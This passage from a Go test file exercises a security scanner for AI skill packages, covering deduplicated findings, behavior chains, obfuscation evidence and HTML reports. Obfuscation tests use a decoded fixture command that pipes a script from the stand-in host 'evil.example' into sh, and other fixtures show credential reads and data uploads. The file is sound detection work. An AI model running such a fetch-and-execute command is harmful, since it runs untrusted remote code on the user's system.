		{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "检测到 shell 执行", Location: "scripts/run.py:20", CodeSnippet: "subprocess.run(cmd)"},
	}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序"}}, EvidenceInventory: []review.EvidenceInventory{{Category: "命令执行", Count: 2}}}, "", nil)

	if len(structured) != 1 {
		t.Fatalf("expected one deduplicated structured finding, got %+v", structured)
	}
	item := structured[0]
	if item.DeduplicatedCount != 2 || item.Category != "命令执行" || item.Confidence != "高" {
		t.Fatalf("unexpected structured finding summary: %+v", item)
	}
	if !strings.Contains(item.AttackPath, "下载后执行") {
		t.Fatalf("expected behavior sequence in attack path, got %q", item.AttackPath)
	}
	if len(item.FalsePositiveChecks) == 0 || !strings.Contains(strings.Join(item.FalsePositiveChecks, "\n"), "运行路径") {
		t.Fatalf("expected false-positive review checks, got %+v", item.FalsePositiveChecks)
	}
	if len(item.CalibrationBasis) == 0 || !strings.Contains(strings.Join(item.CalibrationBasis, "\n"), "高危时序告警") {
		t.Fatalf("expected calibration basis, got %+v", item.CalibrationBasis)
	}
	if len(item.ChainSummaries) == 0 || !strings.Contains(strings.Join(item.ChainSummaries, "\n"), "时序告警: 命中下载后执行时序") {
		t.Fatalf("expected structured chain summaries, got %+v", item.ChainSummaries)
	}
	if len(item.Chains) == 0 || item.Chains[0].Kind == "" {
		t.Fatalf("expected structured chain objects, got %+v", item.Chains)
	}
}

func TestCapabilityMatchesFindingDoesNotMixPeerRiskCategories(t *testing.T) {
	if !capabilityMatchesFinding("外联/网络访问", review.StructuredFinding{Category: "外联与情报"}) {
		t.Fatalf("expected outbound capability to match outbound finding")
	}
	if capabilityMatchesFinding("命令执行", review.StructuredFinding{Category: "外联与情报", Title: "敏感数据外发与隐蔽通道", AttackPath: "外联上传", Evidence: []string{"requests.post(url, data)"}}) {
		t.Fatalf("expected command execution not to match outbound finding")
	}
}

func TestBuildStructuredFindingsAddsStructuredBehaviorChains(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-010", Severity: "高风险", Title: "外联回传", Description: "检测到外联上传", Location: "scripts/run.py:10", CodeSnippet: "requests.post(url, data=payload)"}}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{
		BehaviorChains: []string{"scripts/run.py:10-12 | 下载=0, 落地=0, 执行=0, 外联=1, 持久化=0, 提权=0, 凭据访问=1, 防御规避=0, 横向移动=0, 收集打包=1, C2信标=0"},
		SequenceAlerts: []string{"命中凭据访问后外联时序"},
	}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].ChainSummaries, "\n")
	if !strings.Contains(joined, "行为链: scripts/run.py:10-12") {
		t.Fatalf("expected behavior chain summary, got %s", joined)
	}
	if !strings.Contains(joined, "时序告警: 命中凭据访问后外联时序") {
		t.Fatalf("expected sequence alert summary, got %s", joined)
	}
	if len(structured[0].Chains) != 2 {
		t.Fatalf("expected structured chains emitted, got %+v", structured[0].Chains)
	}
	if structured[0].Chains[0].Kind != "behavior_chain" || structured[0].Chains[0].Source == "" {
		t.Fatalf("expected behavior chain object with source, got %+v", structured[0].Chains[0])
	}
	if structured[0].Chains[0].Path != "scripts/run.py" {
		t.Fatalf("expected behavior chain path extracted, got %+v", structured[0].Chains[0])
	}
	if structured[0].Chains[1].Kind != "sequence_alert" {
		t.Fatalf("expected sequence alert object, got %+v", structured[0].Chains[1])
	}
}

func TestBuildStructuredFindingsAppendsMatchingObfuscationEvidence(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:            "scripts/run.py",
		Technique:       "base64",
		Summary:         "疑似对命令执行载荷进行了编码",
		DecodedText:     "curl https://evil.example/run.sh | sh",
		DataFlowSignals: []string{"解码结果疑似流向执行链", "解码结果疑似流向网络链"},
	}}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].Evidence, "\n")
	if !strings.Contains(joined, "混淆解析证据 / scripts/run.py /") {
		t.Fatalf("expected obfuscation evidence line appended, got %s", joined)
	}
	if !strings.Contains(joined, "还原: curl https://evil.example/run.sh | sh") {
		t.Fatalf("expected decoded payload in evidence, got %s", joined)
	}
	if !strings.Contains(joined, "结论: 文件 scripts/run.py 中恢复出的内容“curl https://evil.example/run.sh | sh”与执行入口同时出现") {
		t.Fatalf("expected data flow signals in evidence, got %s", joined)
	}
	if strings.Contains(joined, "解码结果疑似流向网络链") {
		t.Fatalf("expected unrelated network-chain signal filtered for command finding, got %s", joined)
	}
}

func TestBuildHTMLReportKeepsCapabilityEvidenceBoundToSameRisk(t *testing.T) {
	base := baseScanOutput{}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-003",
			Title:          "敏感数据外发与隐蔽通道",
			Severity:       "高风险",
			Category:       "外联与情报",
			Confidence:     "高",
			AttackPath:     "外联上传",
			Evidence:       []string{"scripts/run.py:12 requests.post(url, data)"},
			ReviewGuidance: "收敛外联目标并限制外发内容",
			Source:         "static-rule",
		}, {
			ID:             "SF-002",
			RuleID:         "V7-009",
			Title:          "命令执行",
			Severity:       "高风险",
			Category:       "命令执行",
			Confidence:     "高",
			AttackPath:     "shell 执行",
			Evidence:       []string{"scripts/run.py:20 os.system(cmd)"},
			ReviewGuidance: "移除 shell 执行",
			Source:         "static-rule",
		}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-003", RemediationFocus: "确认外联白名单并限制敏感数据外发"}, {RuleID: "V7-009", RemediationFocus: "移除 shell 与子进程执行"}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001", Verdict: "倾向真实风险"}, {FindingID: "SF-002", Verdict: "倾向真实风险"}},
		CapabilityMatrix: []review.CapabilityConsistency{{
			Capability:     "外联/网络访问",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			RiskImpact:     "可能产生数据外发",
			Evidence:       []string{"规则证据: V7-003 敏感数据外发与隐蔽通道"},
			NextStep:       "核验外联目标与外发内容",
		}, {
			Capability:     "命令执行",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			RiskImpact:     "可能导致任意命令执行",
			Evidence:       []string{"规则证据: V7-009 命令执行"},
			NextStep:       "移除 shell 执行入口",
		}},
		EvidenceInventory: []review.EvidenceInventory{{Category: "外联行为", Count: 1, Examples: []string{"scripts/run.py:12 requests.post(url, data)"}}},
		Behavior:          review.BehaviorProfile{OutboundIOCs: []string{"scripts/run.py:12 requests.post(url, data)"}, ExecuteIOCs: []string{"scripts/run.py:20 os.system(cmd)"}},
	}
	html := buildHTMLReport("demo.zip", "", []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道"}, {RuleID: "V7-009", Severity: "高风险", Title: "命令执行"}}, base, refined, nil)
	sectionStart := strings.Index(html, "<strong>SF-001 / 敏感数据外发与隐蔽通道</strong>")
	if sectionStart == -1 {
		t.Fatalf("expected outbound finding section in html, got %q", html)
	}
	sectionTail := html[sectionStart:]
	sectionEnd := strings.Index(sectionTail, "</details>")
	if sectionEnd == -1 {
		t.Fatalf("expected outbound finding section to close, got %q", sectionTail)
	}
	section := sectionTail[:sectionEnd]
	if !strings.Contains(section, "外联/网络访问") || !strings.Contains(section, "对应证据: 规则证据: V7-003 敏感数据外发与隐蔽通道") || !strings.Contains(section, "对应修复建议: 收敛外联目标并限制外发内容") {
		t.Fatalf("expected same-risk capability evidence and remediation rendered together, got %q", section)
	}
	if strings.Contains(section, "对应证据: 规则证据: V7-009 命令执行") || strings.Contains(section, "对应修复建议: 移除 shell 执行") {
		t.Fatalf("expected peer risk capability not mixed into outbound finding card, got %q", section)
	}
}

func TestBuildHTMLReportDoesNotReuseSameCapabilityEvidenceContainerAcrossPeerRisks(t *testing.T) {
	base := baseScanOutput{}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-003",
			Title:          "敏感数据外发与隐蔽通道",
			Severity:       "高风险",
			Category:       "外联与情报",
			Confidence:     "高",
			AttackPath:     "scripts/run.py:12-14 | 外联上传",
			Evidence:       []string{"scripts/run.py:12 requests.post(url, data)"},
			ChainSummaries: []string{"行为链: scripts/run.py:12-14 | 外联=1, 收集打包=1"},
			ReviewGuidance: "收敛外联目标并限制外发内容",
			Source:         "static-rule",
		}, {
			ID:             "SF-002",
			RuleID:         "V7-010",
			Title:          "外联回传",
			Severity:       "高风险",
			Category:       "外联与情报",
			Confidence:     "高",
			AttackPath:     "scripts/agent.py:30-34 | 上传压缩结果",
			Evidence:       []string{"scripts/agent.py:31 fetch(uploadURL, archive)"},
			ChainSummaries: []string{"行为链: scripts/agent.py:30-34 | 外联=1, 收集打包=1"},
			ReviewGuidance: "限制结果回传并核验上传目标",
			Source:         "static-rule",
		}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-003", RemediationFocus: "确认外联白名单并限制敏感数据外发"}, {RuleID: "V7-010", RemediationFocus: "限制上传接口与目标"}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001", Verdict: "倾向真实风险"}, {FindingID: "SF-002", Verdict: "倾向真实风险"}},
		CapabilityMatrix: []review.CapabilityConsistency{{
			Capability:     "外联/网络访问",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			RiskImpact:     "可能产生数据外发",
			Evidence: []string{
				"规则证据: V7-003 敏感数据外发与隐蔽通道",
				"规则证据: V7-010 外联回传",
			},
			NextStep: "核验外联目标与外发内容",
		}},
		EvidenceInventory: []review.EvidenceInventory{{Category: "外联行为", Count: 2, Examples: []string{"scripts/run.py:12 requests.post(url, data)", "scripts/agent.py:31 fetch(uploadURL, archive)"}}},
		Behavior:          review.BehaviorProfile{OutboundIOCs: []string{"scripts/run.py:12 requests.post(url, data)", "scripts/agent.py:31 fetch(uploadURL, archive)"}},
	}
	html := buildHTMLReport("demo.zip", "", []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道"}, {RuleID: "V7-010", Severity: "高风险", Title: "外联回传"}}, base, refined, nil)
	firstStart := strings.Index(html, "<strong>SF-001 / 敏感数据外发与隐蔽通道</strong>")
	secondStart := strings.Index(html, "<strong>SF-002 / 外联回传</strong>")
	if firstStart == -1 || secondStart == -1 {
		t.Fatalf("expected both outbound findings in html, got %q", html)
	}
	firstSection := html[firstStart : strings.Index(html[firstStart:], "</details>")+firstStart]
	secondSection := html[secondStart : strings.Index(html[secondStart:], "</details>")+secondStart]
	if !strings.Contains(firstSection, "scripts/run.py:12 requests.post(url, data)") || strings.Contains(firstSection, "scripts/agent.py:31 fetch(uploadURL, archive)") {
		t.Fatalf("expected first risk card to keep only its own evidence, got %q", firstSection)
	}
	if !strings.Contains(secondSection, "scripts/agent.py:31 fetch(uploadURL, archive)") || strings.Contains(secondSection, "scripts/run.py:12 requests.post(url, data)") {
		t.Fatalf("expected second risk card to keep only its own evidence, got %q", secondSection)
	}
	if strings.Contains(firstSection, "对应修复建议: 限制结果回传并核验上传目标") || strings.Contains(secondSection, "对应修复建议: 收敛外联目标并限制外发内容") {
		t.Fatalf("expected remediation guidance to stay bound to each finding, got first=%q second=%q", firstSection, secondSection)
	}
}

func TestBuildStructuredFindingsKeepsOnlyNetworkSignalForNetworkCategory(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-010", Severity: "高风险", Title: "外联回传", Location: "scripts/run.py:10", CodeSnippet: "fetch(url)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:            "scripts/run.py",
		Technique:       "base64",
		Summary:         "疑似对外联目标进行了编码",
		DecodedText:     "https://evil.example/api",
		DataFlowSignals: []string{"解码结果疑似流向执行链", "解码结果疑似流向网络链", "解码结果疑似流向命令构造链"},
	}}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].Evidence, "\n")
	if !strings.Contains(joined, "结论: 文件 scripts/run.py 中恢复出的内容“https://evil.example/api”与网络请求入口同时出现") {
		t.Fatalf("expected network signal retained, got %s", joined)
	}
	if strings.Contains(joined, "执行链") || strings.Contains(joined, "命令构造链") {
		t.Fatalf("expected unrelated signals filtered for network finding, got %s", joined)
	}
}

func TestBuildStructuredFindingsPromotesObfuscationSignalsToChains(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:            "scripts/run.py",
		Technique:       "base64",
		Summary:         "疑似对命令执行载荷进行了编码",
		DecodedText:     "curl https://evil.example/run.sh | sh",
		DataFlowSignals: []string{"解码结果疑似流向执行链", "解码结果疑似流向网络链", "解码结果疑似流向命令构造链"},
	}}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	chains := structured[0].Chains
	if len(chains) < 2 {
		t.Fatalf("expected obfuscation chains appended, got %+v", chains)
	}
	joined := renderFindingChainsForVulnBlock(chains)
	if !strings.Contains(joined, "obfuscation_exec_flow") {
		t.Fatalf("expected exec obfuscation chain in vuln block, got %s", joined)
	}
	if !strings.Contains(joined, "obfuscation_command_flow") {
		t.Fatalf("expected command obfuscation chain in vuln block, got %s", joined)
	}
	if !strings.Contains(joined, "[path=scripts/run.py]") {
		t.Fatalf("expected chain path metadata, got %s", joined)
	}
	if strings.Contains(joined, "obfuscation_network_flow") {
		t.Fatalf("expected unrelated network chain filtered for command finding, got %s", joined)
	}
	if !strings.Contains(strings.Join(structured[0].ChainSummaries, "\n"), "混淆传播:") {
		t.Fatalf("expected obfuscation chain summary, got %+v", structured[0].ChainSummaries)
	}
	promptJoined := formatStructuredFindingForPrompt(structured[0])
	if !strings.Contains(promptJoined, "[path=scripts/run.py]") {
		t.Fatalf("expected prompt rendering keeps path metadata, got %s", promptJoined)
	}
}

func TestChainSourcePathHandlesLineRangesAndPlainPaths(t *testing.T) {
	if got := chainSourcePath("scripts/run.py:10-12"); got != "scripts/run.py" {
		t.Fatalf("expected ranged source trimmed to file path, got %q", got)
	}
	if got := chainSourcePath("docs/guide.md"); got != "docs/guide.md" {
		t.Fatalf("expected plain path preserved, got %q", got)
	}
	if got := chainSourcePath(""); got != "" {
		t.Fatalf("expected empty source preserved, got %q", got)
	}
}

func TestRenderFindingChainsForPromptIncludesPathMetadata(t *testing.T) {
	rendered := renderFindingChainsForPrompt([]review.FindingChain{{
		Kind:    "obfuscation_exec_flow",
		Summary: "文件 scripts/run.py 中恢复出的内容与执行入口同时出现",
		Source:  "解码结果疑似流向执行链",
		Path:    "scripts/run.py",
	}})
	if !strings.Contains(rendered, "[source=解码结果疑似流向执行链]") {
		t.Fatalf("expected prompt rendering contains source metadata, got %s", rendered)
	}
	if !strings.Contains(rendered, "[path=scripts/run.py]") {
		t.Fatalf("expected prompt rendering contains path metadata, got %s", rendered)
	}
}

func TestBuildStructuredFindingsDoesNotAppendOtherFileObfuscationEvidence(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:        "scripts/other.py",
		Summary:     "无关文件",
		DecodedText: "print('noop')",
	}}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].Evidence, "\n")
	if strings.Contains(joined, "混淆解析证据 /") {
		t.Fatalf("expected unrelated obfuscation evidence to be ignored, got %s", joined)
	}
}

func TestBuildStructuredFindingsIgnoresUnrelatedBehaviorSupport(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-006", Severity: "高风险", Title: "凭据访问", Description: "检测到凭据读取", Location: "scripts/auth.py:8", CodeSnippet: "open('.env').read()"}}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{
		BehaviorChains: []string{"scripts/run.py:10-12 | 下载=1, 落地=0, 执行=1, 外联=0, 持久化=0, 提权=0, 凭据访问=0, 防御规避=0, 横向移动=0, 收集打包=0, C2信标=0"},
		SequenceAlerts: []string{"命中下载后执行时序"},
	}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected single structured finding, got %+v", structured)
	}
	item := structured[0]
	if item.Confidence != "待复核" {
		t.Fatalf("expected unrelated behavior support not to boost confidence, got %+v", item)
	}
	if strings.Contains(item.AttackPath, "下载后执行") {
		t.Fatalf("expected unrelated sequence alert not used as attack path, got %+v", item)
	}
}

func TestRelevantBehaviorSupportFiltersZeroCountChains(t *testing.T) {
	behavior := review.BehaviorProfile{BehaviorChains: []string{
		"scripts/run.py:10-12 | 下载=1, 落地=0, 执行=0, 外联=0, 持久化=0, 提权=0, 凭据访问=0, 防御规避=0, 横向移动=0, 收集打包=0, C2信标=0",
		"scripts/run.py:20-22 | 下载=1, 落地=0, 执行=1, 外联=0, 持久化=0, 提权=0, 凭据访问=0, 防御规避=0, 横向移动=0, 收集打包=0, C2信标=0",
	}}
	chains := relevantBehaviorChains("命令执行", behavior)
	if len(chains) != 1 || !strings.Contains(chains[0], "执行=1") {
		t.Fatalf("expected only positive execute chain kept, got %+v", chains)
	}
}

func TestBuildStructuredFindingsSkipsBehaviorSummaryWhenConcreteFindingExists(t *testing.T) {
	findings := []plugins.Finding{
		{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "检测到 shell 执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)\ncleanup()"},
		{PluginName: "BehaviorGuard", RuleID: "V7-009", Severity: "高风险", Title: "自更新与远程下载执行", Description: "检测到 2 条行为证据，请结合证据链进行人工复核与修复闭环。", Location: "行为证据采集", CodeSnippet: "行为证据摘要: 检测到 2 条行为证据，请结合证据链进行人工复核与修复闭环。"},
	}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序"}}}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected behavior summary deduped by concrete finding, got %+v", structured)
	}
	if structured[0].Source != "Static" {
		t.Fatalf("expected concrete static finding retained, got %+v", structured[0])
	}
}

func TestStructuredFindingEvidenceMergesAdjacentCodeWindows(t *testing.T) {
	findings := []plugins.Finding{
		{RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)\ncleanup()"},
		{RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:12", CodeSnippet: "subprocess.run(cmd)"},
	}
	evidence := structuredFindingEvidence(findings, nil)
	if len(evidence) != 1 {
		t.Fatalf("expected merged code evidence, got %+v", evidence)
	}
	block := evidence[0]
	if !strings.Contains(block, "scripts/run.py:10-12") {
		t.Fatalf("expected merged line range, got %q", block)
	}
	if !strings.Contains(block, ">   10 | os.system(cmd)") {
		t.Fatalf("expected hit marker for first line, got %q", block)
	}
	if !strings.Contains(block, "    11 | cleanup()") {
		t.Fatalf("expected non-hit context line, got %q", block)
	}
	if !strings.Contains(block, ">   12 | subprocess.run(cmd)") {
		t.Fatalf("expected hit marker for merged line, got %q", block)
	}
	html := renderHTMLEvidenceList("关键证据", evidence, "未提取")
	if !strings.Contains(html, "代码证据 / scripts/run.py:10-12") {
		t.Fatalf("expected source label in html, got %q", html)
	}
	if strings.Contains(html, "scripts/run.py:10-12\n") {
		t.Fatalf("expected source locator rendered as label instead of code body, got %q", html)
	}
	if !strings.Contains(html, "&gt;   12 | subprocess.run(cmd)") {
		t.Fatalf("expected merged code body in html, got %q", html)
	}
}

func TestStructuredFindingEvidenceUsesSourceContextWindowWhenAvailable(t *testing.T) {
	files := []evaluator.SourceFile{{Path: "/tmp/demo/scripts/run.py", Content: strings.Join([]string{
		"line1()",
		"line2()",
		"line3()",
		"line4()",
		"danger_call()",
		"line6()",
		"line7()",
		"line8()",
	}, "\n")}}
	evidence := structuredFindingEvidence([]plugins.Finding{{RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:5", CodeSnippet: "danger_call()"}}, buildSourceContextIndex("/tmp/demo", files))
	if len(evidence) != 1 {
		t.Fatalf("expected single source-context evidence, got %+v", evidence)
	}
	block := evidence[0]
	for _, want := range []string{"scripts/run.py:2-8", "    2 | line2()", ">    5 | danger_call()", "    8 | line8()"} {
		if !strings.Contains(block, want) {
			t.Fatalf("expected source-context block contains %q, got %q", want, block)
		}
	}
}

func TestStructuredFindingEvidenceDeduplicatesSandboxRuntimeAndSourceContext(t *testing.T) {
	files := []evaluator.SourceFile{{Path: "/tmp/demo/scripts/run.py", Content: strings.Join([]string{
		"prepare()",
		"requests.post(url, data)",
		"cleanup()",
	}, "\n")}}
	evidence := structuredFindingEvidence([]plugins.Finding{
		{RuleID: "V7-003", Severity: "高风险", Title: "外联回传", Location: "scripts/run.py:2", CodeSnippet: "requests.post(url, data)"},
		{RuleID: "V7-003", Severity: "高风险", Title: "外联回传", Location: "[sandbox-runtime] scripts/run.py:2 | requests.post(url, data)", CodeSnippet: "requests.post(url, data)"},
	}, buildSourceContextIndex("/tmp/demo", files))
	if len(evidence) != 1 {
		t.Fatalf("expected sandbox-runtime evidence deduplicated with source context, got %+v", evidence)
	}
	if !strings.Contains(evidence[0], "scripts/run.py:1-3") {
		t.Fatalf("expected normalized source-context evidence retained, got %q", evidence[0])
	}
}

func TestBuildStructuredFindingsDeduplicatesLicenseConfigFindingsAcrossRules(t *testing.T) {
	findings := []plugins.Finding{
		{PluginName: "Static", RuleID: "SF-002", Severity: "高风险", Title: "许可证验证配置缺陷", Description: "许可证验证使用本地默认服务或明文地址", Location: "licensing.py:8", CodeSnippet: `LICENSE_SERVER = "http://localhost:8080"`},
		{PluginName: "Static", RuleID: "SF-005", Severity: "高风险", Title: "许可证验证配置缺陷", Description: "许可证验证失败分支存在放行或绕过语义", Location: "licensing.py:12", CodeSnippet: "if verify_failed: continue"},
		{PluginName: "Static", RuleID: "V7-005", Severity: "高风险", Title: "许可证验证配置缺陷", Description: "授权校验可能被固定为成功", Location: "licensing.py:20", CodeSnippet: "return true"},
	}
	structured := buildStructuredFindings(findings, review.Result{}, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected license config findings deduplicated into one structured finding, got %+v", structured)
	}
	if structured[0].DeduplicatedCount != 3 {
		t.Fatalf("expected merged license finding count 3, got %+v", structured[0])
	}
	if structured[0].Title != "许可证验证配置缺陷" {
		t.Fatalf("expected normalized license title retained, got %+v", structured[0])
	}
}

func TestCollectSourceArtifactsIncludesDependencyManifests(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Demo\n需要网络访问"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module demo\n\nrequire github.com/example/lib v1.2.3\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"dependencies":{"axios":"^1.6.0"}}`), 0644); err != nil {
		t.Fatal(err)
	}

	files, deps, _ := collectSourceArtifacts(dir, nil)
	profile := buildSkillAnalysisProfile(dir, files, deps, []string{"network"})

	if profile.DependencyCount != 2 {
		t.Fatalf("expected go.mod and package.json dependencies, got %+v", profile.Dependencies)
	}
	joinedLang := strings.Join(profile.LanguageSummary, ",")
	if !strings.Contains(joinedLang, "gomod:1") || !strings.Contains(joinedLang, "json:1") {
		t.Fatalf("expected dependency manifest language summary, got %+v", profile.LanguageSummary)
	}
}

func TestCollectSourceArtifactsFromRealisticFixtureTree(t *testing.T) {
	dir := createRealisticSkillFixtureTree(t)
	files, deps, _ := collectSourceArtifacts(dir, nil)
	profile := buildSkillAnalysisProfile(dir, files, deps, []string{"network", "command"})

	if profile.SourceFileCount < 4 {
		t.Fatalf("expected multiple source files from fixture tree, got %+v", profile.SourceFiles)
	}
	if profile.DeclarationCount < 2 {
		t.Fatalf("expected declaration files discovered, got %+v", profile.DeclarationSources)
	}
	if profile.DependencyCount < 2 {
		t.Fatalf("expected dependencies discovered, got %+v", profile.Dependencies)
	}
	joinedSources := strings.Join(profile.SourceFiles, "\n")
	for _, want := range []string{"SKILL.md", "README.md", "scripts/run.py", "web/package.json"} {
		if !strings.Contains(joinedSources, want) {
			t.Fatalf("expected fixture source %q in %s", want, joinedSources)
		}
	}
}

func TestCollectSourceArtifactsIncrementalCacheHit(t *testing.T) {
	t.Setenv("SKILL_SCANNER_INCREMENTAL_SCAN_CACHE", "true")
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Demo\ncache"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("print('ok')\n"), 0644); err != nil {
		t.Fatal(err)
	}

	_, _, first := collectSourceArtifacts(dir, nil)
	if !first.Enabled || first.Candidate == 0 {
		t.Fatalf("expected incremental cache enabled and candidates, got %+v", first)
	}

	_, _, second := collectSourceArtifacts(dir, nil)
	if second.Hit == 0 {
		t.Fatalf("expected cache hit on second run, got %+v", second)
	}
	if _, err := os.Stat(filepath.Join(dir, ".scan-cache.json")); err != nil {
		t.Fatalf("expected cache file exists, err=%v", err)
	}
}

func TestCollectSourceArtifactsIncrementalCacheDisabled(t *testing.T) {
	t.Setenv("SKILL_SCANNER_INCREMENTAL_SCAN_CACHE", "false")
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Demo\ncache-off"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("print('ok')\n"), 0644); err != nil {
		t.Fatal(err)
	}

	_, _, stats := collectSourceArtifacts(dir, nil)
	if stats.Enabled {
		t.Fatalf("expected cache disabled, got %+v", stats)
	}
	if _, err := os.Stat(filepath.Join(dir, ".scan-cache.json")); err == nil {
		t.Fatal("expected no cache file generated when disabled")
	}
}

func TestCollectSourceArtifactsIncrementalCacheInvalidatesOnFileChange(t *testing.T) {
	t.Setenv("SKILL_SCANNER_INCREMENTAL_SCAN_CACHE", "true")
	dir := t.TempDir()
	target := filepath.Join(dir, "main.py")
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Demo\ncache-change"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, []byte("print('v1')\n"), 0644); err != nil {
		t.Fatal(err)
	}

	_, _, first := collectSourceArtifacts(dir, nil)
	if first.Candidate == 0 {
		t.Fatalf("expected candidates in first run, got %+v", first)
	}

	if err := os.WriteFile(target, []byte("print('v2 changed')\n"), 0644); err != nil {
		t.Fatal(err)
	}
	_, _, second := collectSourceArtifacts(dir, nil)
	if second.Miss == 0 {
		t.Fatalf("expected cache miss after file content changed, got %+v", second)
	}
}

func TestCollectSourceArtifactsRecoversFromInvalidCacheFile(t *testing.T) {
	t.Setenv("SKILL_SCANNER_INCREMENTAL_SCAN_CACHE", "true")
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Demo\ncache-invalid"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("print('ok')\n"), 0644); err != nil {
		t.Fatal(err)
	}
	cacheFile := filepath.Join(dir, ".scan-cache.json")
	if err := os.WriteFile(cacheFile, []byte("{invalid-json"), 0644); err != nil {
		t.Fatal(err)
	}

	files, deps, stats := collectSourceArtifacts(dir, nil)
	if len(files) == 0 {
		t.Fatalf("expected files still collected when cache is invalid, deps=%v stats=%+v", deps, stats)
	}
	if !stats.Enabled {
		t.Fatalf("expected cache mode still enabled, got %+v", stats)
	}
	data, err := os.ReadFile(cacheFile)
	if err != nil {
		t.Fatalf("expected cache file rewritten, err=%v", err)
	}
	if !strings.Contains(string(data), "\"version\":\"v1\"") {
		t.Fatalf("expected rewritten cache contains version marker, got %q", string(data))
	}
}

func TestCollectSourceArtifactsRebuildsWhenCacheVersionMismatch(t *testing.T) {
	t.Setenv("SKILL_SCANNER_INCREMENTAL_SCAN_CACHE", "true")
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Demo\ncache-version"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("print('ok')\n"), 0644); err != nil {
		t.Fatal(err)
	}
	cacheFile := filepath.Join(dir, ".scan-cache.json")
	if err := os.WriteFile(cacheFile, []byte(`{"version":"legacy-v0","files":{"main.py":{"fingerprint":{"rel_path":"main.py","language":"python","sha256":"x","size":1,"mod_unix":1},"source":{"path":"main.py","content":"stale","language":"python"}}}}`), 0644); err != nil {
		t.Fatal(err)
	}

	files, _, stats := collectSourceArtifacts(dir, nil)
	if len(files) == 0 || !stats.Enabled {
		t.Fatalf("expected scanner rebuilds artifacts on version mismatch, files=%d stats=%+v", len(files), stats)
	}
	data, err := os.ReadFile(cacheFile)
	if err != nil {
